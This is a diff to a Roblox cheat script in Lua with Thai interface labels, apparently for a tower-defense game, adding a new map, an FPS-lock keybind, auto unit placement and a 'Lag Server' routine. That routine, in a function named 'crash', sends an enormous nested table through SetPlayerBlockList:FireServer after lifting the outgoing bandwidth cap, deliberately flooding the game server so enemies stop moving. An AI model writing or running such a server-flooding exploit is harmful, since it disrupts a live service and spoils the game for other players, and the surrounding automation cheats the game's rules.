@@ -2469,6 +2469,10 @@ function PjxInit()
 	-- Select Unit
 	getgenv().SelectedUnits = data.xselectedUnits or {}
 
+	-- time Lag
+	getgenv().timelock = data.timelock
+	getgenv().takeTime = data.takeTime
+
 	function updatejson()
 		local xdata = {
 
@@ -2508,6 +2512,10 @@ function PjxInit()
 			questtoday = getgenv().questtoday,
 			-- Job ID
 			jobID = getgenv().jobID,
+
+			-- time Lag
+			timelock = getgenv().timelock,
+			takeTime = getgenv().takeTime,
 
 		}
 		local json = HttpService:JSONEncode(xdata)
@@ -2611,6 +2619,7 @@ function PjxInit()
 					"Alien Spaceship",
 					"Fabled Kingdom",
 					"Hero City",
+					"Puppet Island",
 					"Clover Legend - HARD",
 					"Hollow Legend - HARD",
 					"Cape Legend - HARD",
@@ -2805,6 +2814,16 @@ function PjxInit()
 									"mha_legend_5",
 									"mha_legend_6"
 							}
+					elseif Value == "Puppet Island" then
+						getgenv().levels = {
+								"dressrosa_infinite",
+								"dressrosa_level_1",
+								"dressrosa_level_2",
+								"dressrosa_level_3",
+								"dressrosa_level_4",
+								"dressrosa_level_5",
+								"dressrosa_level_6"
+						}
 					end
 					updatejson()
 					pcall(function()
@@ -3016,6 +3035,46 @@ function PjxInit()
 						getgenv().lockfps = x
 						updatejson()
 				end,
+		})
+
+		-- ปุ่มกด ตั้งค่าล็อค FPS
+		Tab:AddBind({
+			Name = "ปุ่มเปิด-ปิด Lock FPS [F2]",
+			Default = Enum.KeyCode.F2,
+			Hold = false,
+			Callback = function(x)
+				getgenv().lockfps = not getgenv().lockfps
+				updatejson()
+				if getgenv().lockfps then
+					setfpscap(5)
+				else
+					setfpscap(15)
+				end
+			end
+		})
+
+		--มอนไม่เดิน
+		Tab:AddToggle({
+				Name = "🚨 มอนเตอร์ไม่เดิน",
+				Default = getgenv().timelock,
+				Callback = function(bool)
+						getgenv().timelock = bool
+						updatejson()
+				end,
+		})
+		--ระดับความแลค
+		Tab:AddSlider({
+			Name = "ระดับความแลค(ยิ่งน้อยยิ่งแลค)",
+			Min = 0,
+			Max = 3,
+			Default = getgenv().takeTime,
+			Color = Color3.fromRGB(247,4,203),
+			Increment = 0.2,
+			ValueName = " -> ปรับระดับ",
+			Callback = function(Value)
+					getgenv().takeTime = Value
+					updatejson()
+			end    
 		})
 
 		local Section = Tab:AddSection({ Name = "ตั้งค่าเกม" })
@@ -3383,6 +3442,10 @@ else
 		-- Job ID
 		jobID = "",
 
+		-- time Lag
+		timelock = false,
+		takeTime = 3,
+
 		--Select Unit
 		xselectedUnits = {},
 
@@ -3578,11 +3641,16 @@ coroutine.resume(coroutine.create(function()
 					[2] = { x = -130.05, y = 504.78, z = -93.73 }, -- hill unit position -130.05752563476562, 504.7899169921875, -93.732666015625
 					[3] = { x = -97.27, y = -97.27, z = -92.03 }, -- hill unit position -97.27552032470703, 500.6242980957031, -92.03937530517578
 				})
+				elseif game.Workspace._map:FindFirstChild("hay") then  -- ONE PICE
+				auto_place_units({
+					[1] = { x = pos_x, y = 2.60, z = pos_z }, -- ground unit position 
+					[2] = { x = -41.454, y = 5.986, z = -185.049 }, -- hill unit position -130.05752563476562, 504.7899169921875, -93.732666015625
+				})
 			end
 		end
 	end
 end))
-
+--Puppet Island
 --#endregion 
 
 --#region Auto Upgrade
@@ -4483,6 +4551,46 @@ function auto_reconnect()
   end)
 end
 auto_reconnect()
+--#endregion
+
+--#region Lag Server
+
+coroutine.resume(coroutine.create(function()
+	while task.wait(1) do
+		if game.PlaceId ~= 8304191830 then
+			if getgenv().timelock then
+				while wait(getgenv().takeTime) do
+					if getgenv().timelock == false then
+						break
+					end
+					local table1 = {}
+					local table2 = {}
+					local function loop(v1,v2)
+						for i = v1,v2 do
+							table.insert(table1, table2)
+						end
+					end
+					local function crash(v1) 
+						for i = 1,v1 do
+							table.insert(table2[1], {})
+						end 
+					
+						if 499999/(v1+2) then
+							loop(1,499999/(v1+2))
+						else
+							loop(1,499999)
+						end
+						game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(table1)
+					end
+					table.insert(table2, {})
+					game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+					crash(250)
+				end					
+			end
+		end
+	end
+end))
+
 --#endregion
 
 -- [[ จบฟังชั่นทั่วไป ]] --
